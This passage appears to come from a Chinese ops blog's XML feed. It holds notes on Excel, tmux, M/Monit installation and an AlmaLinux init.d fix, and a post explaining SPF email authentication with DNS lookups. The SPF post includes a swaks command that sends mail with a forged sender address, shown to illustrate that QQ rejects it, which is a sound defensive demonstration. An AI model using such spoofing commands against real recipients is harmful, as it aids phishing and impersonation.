    <content type="html"><![CDATA[<span id="more"></span><h2 id="自动适配列宽度"><a href="#自动适配列宽度" class="headerlink" title="自动适配列宽度"></a><strong>自动适配列宽度</strong></h2><h3 id="for-mac"><a href="#for-mac" class="headerlink" title="for mac"></a><strong>for mac</strong></h3><p><strong>使用功能区按钮</strong></p><p>1、选择需要调整的列</p><p>2、转到工具栏的“开始”选项卡</p><p>3、找到“格式”按钮并点击</p><p>4、在弹出的菜单中选择“自动调整列宽”</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
      <tag>excel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tmux</title>
    <link href="/2024/10/29/yunwei/applications/tmux/tmux/"/>
    <url>/2024/10/29/yunwei/applications/tmux/tmux/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a><strong>Centos</strong></h3><p>yum install tmux -y</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># rpm -qa | grep tmux tmux-1.8-4.el7.x86_64</span><br></code></pre></td></tr></table></figure><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a><strong>Ubuntu</strong></h3><p>apt-get install tmux</p><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a><strong>Mac</strong></h3><p>brew install tmux</p><h2 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a><strong>操作命令</strong></h2><h3 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a><strong>新建会话</strong></h3><p><strong>tmux new -s</strong> </p><h3 id="列举后台运行会话"><a href="#列举后台运行会话" class="headerlink" title="列举后台运行会话"></a><strong>列举后台运行会话</strong></h3><p><strong>tmux ls</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux ls</span><br>logs: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="连接指定后台运行会话"><a href="#连接指定后台运行会话" class="headerlink" title="连接指定后台运行会话"></a><strong>连接指定后台运行会话</strong></h3><p><strong>tmux a -t sessionName</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">root@nvm /</span>]<span class="hljs-meta"># tmux ls</span><br>logs: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[<span class="hljs-meta">root@nvm /</span>]<span class="hljs-meta"># tmux a -t logs</span><br>[<span class="hljs-meta">detached</span>]<br>[<span class="hljs-meta">root@nvm /</span>]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="重命名会话名"><a href="#重命名会话名" class="headerlink" title="重命名会话名"></a><strong>重命名会话名</strong></h3><p><strong>tmux rename -t oldName newName</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux ls</span><br>logs: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux rename -t logs securelog</span><br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux ls</span><br>securelog: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="操作快捷键"><a href="#操作快捷键" class="headerlink" title="操作快捷键"></a><strong>操作快捷键</strong></h2><h3 id="分离会话"><a href="#分离会话" class="headerlink" title="分离会话"></a><strong>分离会话</strong></h3><p>退出界面，会话保持在后台</p><p><strong>ctrl+b 接 d</strong></p><h3 id="重命名会话"><a href="#重命名会话" class="headerlink" title="重命名会话"></a><strong>重命名会话</strong></h3><p><strong>ctr+b 接 $</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-keyword">rename</span>-<span class="hljs-keyword">session</span>) logs<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>tmux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vmware_base</title>
    <link href="/2024/10/29/yunwei/applications/vmware/vmware_base/"/>
    <url>/2024/10/29/yunwei/applications/vmware/vmware_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion">https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mmonit_install</title>
    <link href="/2024/05/29/yunwei/applications/mmonit/mmonit_install/"/>
    <url>/2024/05/29/yunwei/applications/mmonit/mmonit_install/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>1、下载文件</p><p>wget  <a href="https://mmonit.com/dist/mmonit-4.2.2-linux-x64.tar.gz">https://mmonit.com/dist/mmonit-4.2.2-linux-x64.tar.gz</a></p><p>2、解压文件</p><p>tar -zxvf mmonit-4.2.2-linux-x64.tar.gz</p><p>3、启动守护程序</p><p>cd mmonit-4.2.2&#x2F;</p><p>.&#x2F;bin&#x2F;mmonit</p><p>4、修改监听端口</p><p>配置文件：.&#x2F;conf&#x2F;server.xm</p><p>默认端口：8080</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;Connector address<span class="hljs-operator">=</span><span class="hljs-string">&quot;*&quot;</span> port<span class="hljs-operator">=</span><span class="hljs-string">&quot;8080&quot;</span> processors<span class="hljs-operator">=</span><span class="hljs-string">&quot;25&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>修改监听端口：54321</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;Connector address<span class="hljs-operator">=</span><span class="hljs-string">&quot;*&quot;</span> port<span class="hljs-operator">=</span><span class="hljs-string">&quot;54321&quot;</span> processors<span class="hljs-operator">=</span><span class="hljs-string">&quot;25&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>5、重新启动</p><p>kill mmonit 进程</p><p>.&#x2F;bin&#x2F;mmonit</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:54321</span>           <span class="hljs-number">0.0.0.0</span>:*               LISTEN      <span class="hljs-number">2963155</span>/./bin/mmoni<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>mmonit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>mmonit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>error_almalinux_no_init.d</title>
    <link href="/2024/05/17/yunwei/errors/Linuxerrors/error_almalinux_no_init.d/"/>
    <url>/2024/05/17/yunwei/errors/Linuxerrors/error_almalinux_no_init.d/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在AlmaLinux release 9.2 (Turquoise Kodkod)系统中没有找到&#x2F;etc&#x2F;init.d文件夹，该文件夹常备用来设置服务启动</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>因为是由一个chkconfig的包来实现脚本的服务管理的，&#x2F;etc&#x2F;init.d&#x2F;也只是&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;的软连接，所以没有&#x2F;etc&#x2F;init.d就把chkconfig的包装一下就行了</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">dnf <span class="hljs-keyword">install</span> chkconfig<br></code></pre></td></tr></table></figure><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p>【1】 linux &#x2F;etc&#x2F;init.d&#x2F;目录不存在  2023-03-08 11:16 碎了的冰</p><p><a href="https://www.cnblogs.com/lightice/p/17191350.html">https://www.cnblogs.com/lightice/p/17191350.html</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mailsec_spf</title>
    <link href="/2024/05/16/security/itsec/mailsec/mailsec_spf/"/>
    <url>/2024/05/16/security/itsec/mailsec/mailsec_spf/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="SPF-Sender-Policy-Framework"><a href="#SPF-Sender-Policy-Framework" class="headerlink" title="SPF(Sender Policy Framework)"></a>SPF(Sender Policy Framework)</h1><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a><strong>作用</strong></h3><p>可以防止别人伪造你来发邮件，是一个反伪造邮件的解决方案。</p><p>当你定义了你的邮箱域名的 SPF 记录之后，接收邮件方会根据你的SPF记录来确定连接过来的IP地址是否被包含在 SPF 记录里面，如果在，则认为是一份正确的邮件，否则则认为是一份伪造的邮件。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a><strong>语法</strong></h3><p>SPF简单说就是域名DNS的txt记录</p><p>SPF 记录包含在一个 TXT 记录中</p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p> <strong>v&#x3D;spf1 [[pre] type [ext]] … [mod]</strong></p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>每个参数的含义：</p><p>v&#x3D;spf1 : SPF 的版本，如果使用 Sender ID 的话，这个字段就应该是 v&#x3D;spf2</p><p>pre: 定义匹配时的返回值</p><p>可能返回值包括：</p><p>+，在验证完成的时候表示通过。 </p><p>- 表示验证失败。这个值通常是 -all ，表示没有其他任何匹配发生，会直接丢弃邮件。</p><p>~ 表示软验证，通常表示验证没有完成，不会直接丢弃邮件，可能会进入垃圾箱或者隔离。 </p><p>? 表示不置可否。这个值也通常在测试没有完成的时候使用</p><p>type:定义使用的确认测试的类型</p><p>可能的值包括：</p><p><a href="https://blog.51cto.com/alandai/1929489">https://blog.51cto.com/alandai/1929489</a></p><p><a href="http://www.magicwinmail.com/technic_spf.php">http://www.magicwinmail.com/technic_spf.php</a></p><p><a href="https://help.aliyun.com/knowledge_detail/36771.html">https://help.aliyun.com/knowledge_detail/36771.html</a></p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>v&#x3D;spf1 a mx -all</p><p>表示允许a记录和MX服务器的A记录发送邮件</p><p>v&#x3D;spf1 a:test.com -all</p><p>表示允许test.com域名的a记录发送邮件</p><p>v&#x3D;spf1 a&#x2F;24 a:test.test.com&#x2F;24 -all</p><p>表示允许a记录的C段都允许,如果test.test.com存在多个A记录地址，每个A记录的C段都允许发送邮件</p><p>v&#x3D;spf1 mx mx:test.domain.com -all</p><p>表示当前域名的mx记录对应的a记录IP，和test.domain.com的mx记录对应的a记录IP允许发送邮件</p><h3 id="查看方法"><a href="#查看方法" class="headerlink" title="查看方法"></a><strong>查看方法</strong></h3><h4 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a><strong>Windows：</strong></h4><p><strong>nslookup -q&#x3D;txt domain</strong></p><p><strong>nslookup -type&#x3D;txt domain</strong></p><h5 id="有SPF的域名"><a href="#有SPF的域名" class="headerlink" title="有SPF的域名"></a>有SPF的域名</h5><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">D:\&gt;nslookup -q=txt qq.com</span><br><span class="hljs-section">服务器:  UnKnown</span><br><span class="hljs-section">Address:  10.211.1.8</span><br><br><span class="hljs-section">非权威应答:</span><br>qq.com  text =<br><br>        <span class="hljs-string">&quot;v=spf1 include:spf.mail.qq.com -all&quot;</span><br></code></pre></td></tr></table></figure><p>解释：include:spf.mail.qq.com表示使用spf.mail.qq.com的spf记录</p><p>​      -all 表示除spf.mail.qq.com spf设置的IP外，其他的硬拒绝，就是完全不收</p><p>因为spf其实最终都是针对IP进行限制的，所以想要看具体限制的IP，可以接着查询对应域名的spf记录，例如查询spf.mail.qq.com</p><p><strong>nslookup -type&#x3D;txt spf.mail.qq.com</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs stylus">D:\&gt;nslookup -q=txt spf<span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>服务器:  UnKnown<br>Address:  <span class="hljs-number">10.211</span>.<span class="hljs-number">1.8</span><br><br>非权威应答:<br>spf<span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">text</span> =<br><br>        <span class="hljs-string">&quot;v=spf1 include:qq-a.mail.qq.com include:qq-b.mail.qq.com include:qq-c.mail.qq.com include:biz-a.mail.qq.com include:biz-b.mail.qq.com include:biz-c.mail.qq.com include:biz-d.mail.qq.com -all&quot;</span><br><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">116.128</span>.<span class="hljs-number">153.20</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  AAAA IPv6 <span class="hljs-selector-tag">address</span> = <span class="hljs-number">2402</span>:<span class="hljs-number">4</span>e00:<span class="hljs-number">8030</span>::<span class="hljs-number">3</span><br><br>D:\&gt;nslookup -q=txt qq-<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>服务器:  UnKnown<br>Address:  <span class="hljs-number">10.211</span>.<span class="hljs-number">1.8</span><br><br>非权威应答:<br>qq-<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>        <span class="hljs-selector-tag">text</span> =<br><br>        <span class="hljs-string">&quot;v=spf1 ip4:101.226.139.0/25 ip4:101.91.43.0/25 ip4:101.91.44.128/25 ip4:112.64.237.128/25 ip4:116.128.173.0/25 ip4:121.51.40.128/25 ip4:121.51.6.0/25 ip4:162.62.52.214 ip4:162.62.55.67 ip4:162.62.57.0/24 ip4:162.62.58.211 ip4:162.62.58.216 -all&quot;</span><br><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">116.128</span>.<span class="hljs-number">153.20</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  AAAA IPv6 <span class="hljs-selector-tag">address</span> = <span class="hljs-number">2402</span>:<span class="hljs-number">4</span>e00:<span class="hljs-number">8030</span>::<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h5 id="没有spf的记录"><a href="#没有spf的记录" class="headerlink" title="没有spf的记录"></a><strong>没有spf的记录</strong></h5><p>nslookup -type&#x3D;txt 165.com</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">D:\&gt;nslookup -<span class="hljs-keyword">type</span>=txt <span class="hljs-number">165.</span>com<br>服务器:  <span class="hljs-type">UnKnown</span><br>Address:  <span class="hljs-number">10.211</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span><br><br><span class="hljs-number">165.</span>com<br>        <span class="hljs-keyword">primary</span> <span class="hljs-type">name</span> <span class="hljs-keyword">server</span> = coby.ns.cloudflare.com<br>        responsible mail addr = dns.cloudflare.com<br>        <span class="hljs-type">serial</span>  = <span class="hljs-number">2036766500</span><br>        <span class="hljs-keyword">refresh</span> = <span class="hljs-number">10000</span> (<span class="hljs-number">2</span> hours <span class="hljs-number">46</span> mins <span class="hljs-number">40</span> secs)<br>        retry   = <span class="hljs-number">2400</span> (<span class="hljs-number">40</span> mins)<br>        expire  = <span class="hljs-number">604800</span> (<span class="hljs-number">7</span> days)<br>        <span class="hljs-keyword">default</span> TTL = <span class="hljs-number">3600</span> (<span class="hljs-number">1</span> hour)<br></code></pre></td></tr></table></figure><h4 id="mac-linux"><a href="#mac-linux" class="headerlink" title="mac &#x2F; linux"></a><strong>mac &#x2F; linux</strong></h4><h5 id="dig"><a href="#dig" class="headerlink" title="dig"></a><strong>dig</strong></h5><p>​<strong>dig -t txt domain</strong></p><h5 id="host"><a href="#host" class="headerlink" title="host"></a><strong>host</strong></h5><p>​<strong>host -t txt domain</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">(base) [root@<span class="hljs-number">110</span> ~]# host -t txt qq.com<br>qq.com descriptive text &quot;v=spf1 include:spf.mail.qq.com -all&quot;<br><br>(base) [root@<span class="hljs-number">110</span> ~]# host -t txt spf.mail.qq.com<br>spf.mail.qq.com descriptive text &quot;v=spf1 include:qq-a.mail.qq.com include:qq-b.mail.qq.com include:qq-c.mail.qq.com include:biz-a.mail.qq.com include:biz-b.mail.qq.com include:biz-c.mail.qq.com include:biz-d.mail.qq.com -all&quot;<br><br>(base) [root@<span class="hljs-number">110</span> ~]# host -t txt qq-a.mail.qq.com<br>qq-a.mail.qq.com descriptive text &quot;v=spf1 ip<span class="hljs-number">4:101.226.139</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:101.91.43</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:101.91.44</span>.<span class="hljs-number">128</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:112.64.237</span>.<span class="hljs-number">128</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:116.128.173</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:121.51.40</span>.<span class="hljs-number">128</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:121.51.6</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:162.62.52</span>.<span class="hljs-number">214</span> ip<span class="hljs-number">4:162.62.55</span>.<span class="hljs-number">67</span> ip<span class="hljs-number">4:162.62.57</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> ip<span class="hljs-number">4:162.62.58</span>.<span class="hljs-number">211</span> ip<span class="hljs-number">4:162.62.58</span>.<span class="hljs-number">216</span> -all&quot;<br></code></pre></td></tr></table></figure><h3 id="设置方法"><a href="#设置方法" class="headerlink" title="设置方法"></a><strong>设置方法</strong></h3><p>也可以说spf记录就是DNS解析记录</p><p>在阿里云上，可以直接添加一条记录</p><p>v&#x3D;spf1 ip4:121.43.138.1 -all</p><p>表示只有从 121.43.138.1 发送的邮件为合法邮件，其他的全部拒绝。</p><h3 id="软硬拒绝"><a href="#软硬拒绝" class="headerlink" title="软硬拒绝"></a>软硬拒绝</h3><h4 id="软拒绝"><a href="#软拒绝" class="headerlink" title="软拒绝"></a>软拒绝</h4><p>~ 软拒绝，硬拒绝会丢弃很多邮件，为避免这种情况，会设置为软拒绝，如果设置软拒绝，表示发件IP非法，但是不采取强硬措施，可能会标为垃圾邮件等</p><p>test.site的 SPF 设置为软拒绝</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─<span class="hljs-comment"># host -t txt test.site</span><br>vict.site descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;v=spf1 ip4:121.43.138.1 ~all&quot;</span><br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件QQ邮箱拒绝"><a href="#软拒绝-伪造的邮件QQ邮箱拒绝" class="headerlink" title="软拒绝-伪造的邮件QQ邮箱拒绝"></a>软拒绝-伪造的邮件QQ邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@foxmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;~all to qq&quot;</span><br>=== Trying mx3.qq.com:<span class="hljs-number">25.</span>..<br>=== Connected to mx3.qq.com.<br>&lt;-  <span class="hljs-number">220</span> newxmmxszb1<span class="hljs-number">-2.</span>qq.com MX QQ Mail Server.<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-newxmmxszb1<span class="hljs-number">-2.</span>qq.com<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; RCPT TO:&lt;test@foxmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;.<br> -&gt; Date: Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">55</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@foxmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">55</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230409083655.000017</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; ~all to qq<br> -&gt; <br> -&gt; <br> -&gt; .<br><br>&lt;** <span class="hljs-number">550</span> SPF check failed [MO+TD704vLucbv7Hd8BASEhQm5HgwZ88L3vGy9OWHck+hKp4HTLoROmFlo7u7dv/KQ==  IP: <span class="hljs-number">61.135</span><span class="hljs-number">.152</span><span class="hljs-number">.141</span>]. https:<span class="hljs-comment">//service.mail.qq.com/detail/122/72.</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye.<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br><br></code></pre></td></tr></table></figure><p>提示SPF检查失败</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">550 SPF<span class="hljs-built_in"> check </span>failed [MO+TD704vLucbv7Hd8BASEhQm5HgwZ88L3vGy9OWHck+hKp4HTLoROmFlo7u7dv/KQ==  IP: 61.135.152.141]. 